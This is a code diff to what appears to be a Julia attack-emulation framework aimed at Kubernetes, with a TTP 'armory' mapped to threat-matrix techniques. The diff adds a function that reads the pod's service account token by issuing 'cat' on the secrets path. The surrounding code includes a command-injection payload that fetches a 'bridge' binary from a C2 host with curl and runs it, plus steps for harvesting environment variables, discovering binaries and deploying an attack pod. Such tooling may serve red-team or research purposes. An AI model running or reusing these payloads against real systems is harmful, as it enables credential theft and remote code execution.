@@ -1,5 +1,7 @@
 using StructTypes
 
+SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 
 Base.@kwdef struct ExploitParams 
     endpoint:: String
@@ -30,18 +32,18 @@ Base.@kwdef struct TTP
     id:: Union{String, Nothing} = string(uuid4())
     technique :: String
     name :: String
-    action :: Union{String, Nothing} = nothing
+    action :: Union{String, Function, Nothing} = nothing
     cmd_args :: Union{String, Nothing} = nothing
     tactics :: Vector{String}
     ms_id :: String = ""
-    execute :: Union{Function, Nothing} = nothing
+    postProcess :: Union{Function, Nothing} = nothing
     requires :: Union{Dict,Nothing} = Dict()
     params :: Union{ExploitParams, DeployPodParams, Nothing} = nothing
 end
 
 StructTypes.StructType(::Type{TTP}) = StructTypes.Mutable()
 StructTypes.omitempties(::Type{TTP}) = true
-StructTypes.excludes(::Type{TTP}) = (:execute, ) # exclude the execute function from serialization
+StructTypes.excludes(::Type{TTP}) = (:postProcess, :action) # exclude the postProcess function from serialization
 
 
 
@@ -49,8 +51,16 @@ function exploit_cmd_injection(ttp::TTP, target::String, c2::String)
     @error "Exploiting CMD injection not yet implemented"
 end
 
-function read_service_account_token(ttp::TTP, target::String, c2::String)
-    @error "Read SA token not yet implemented"
+
+function readServiceAccountToken(session:: AbstractSession, systemId:: SystemId) :: ServiceAccountTokenExtracted
+    put!(session.commands, "cat $SA_TOKEN_PATH")
+    cmd, token = take!(session.results)
+    if isnothing(token)
+        @error "Could not read service account token"
+        return nothing
+    end
+
+    return ServiceAccountTokenExtracted(token, systemId)
 end
 
 function get_sa_token_permission()
@@ -112,7 +122,7 @@ function readEnvironmentVariables(ev::ActionExecuted)
             envVars[k] = v
         end
     end
-    return EnvironmentVariablesExtracted(ev.action.target, envVars)
+    return EnvironmentVariablesExtracted(ev.target, envVars)
 end
 
 function list_available_binaries( kwargs...) :: Union{Event, Nothing}
@@ -157,7 +167,7 @@ function getArmory() :: Vector{TTP}
                 name="Exploit Proxy Service CMD injection",
                 tactics=[string(LateralMovement)],
                 technique=string(ExploitationForPrivilegeEscalation),
-                execute=exploit_cmd_injection,
+                postProcess=exploit_cmd_injection,
                 params=ExploitParams(
                     endpoint=raw"$TARGET/image",
                     params=Dict("url" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
@@ -174,17 +184,17 @@ function getArmory() :: Vector{TTP}
                 ms_id="MS-TA9016",
                 technique=string(ContainerServiceAccount),  # MITRE would be StealApplicationAccessToken
                 tactics=[string(CredentialAccess)],
-                action="get_file",
+                action=readServiceAccountToken,
                 requires=Dict("accessLevel"=> UserRead),
                 # consequence=["pod_name", "serviceaccount_name", "namespace name"],
-                execute=read_service_account_token,
+                # postProcess=readServiceAccountToken,
             ),
             TTP(
                 name="Check ServiceAccount permissions",
                 tactics=[string(Discovery)],
                 technique=string(PermissionGroupsDiscovery_CloudGroups),  # TODO: not sure about this mapping
                 requires=Dict("kind" => "ServiceAccount"),
-                execute=get_sa_token_permission,
+                postProcess=get_sa_token_permission,
             ),
             # TTP(
             #     name="Container and Resource Discovery",
@@ -198,14 +208,14 @@ function getArmory() :: Vector{TTP}
                 tactics=[string(Discovery)],
                 technique=string(GatherVictimHostInformation),
                 action="env",
-                execute=readEnvironmentVariables,
+                postProcess=readEnvironmentVariables,
                 requires=Dict("os"=> ["linux", "macOS"], "accessLevel"=> UserExecute),
             ),
             TTP(
                 name="List binaries",
                 tactics=[string(Discovery)],
                 technique=string(GatherVictimHostInformation),
-                execute=list_available_binaries,
+                postProcess=list_available_binaries,
                 requires=Dict("os"=> "linux", "accessLevel"=> UserExecute),
             ),
             TTP(
@@ -220,7 +230,7 @@ function getArmory() :: Vector{TTP}
                 tactics=[string(Execution)],
                 technique=string(DeployContainer),
                 # requires={"can": "create pods"},
-                execute=deploy_pod,
+                postProcess=deploy_pod,
                 params=DeployPodParams(
                     name="Debug Pod",
                     image="r0binak/mtkpi:v1",
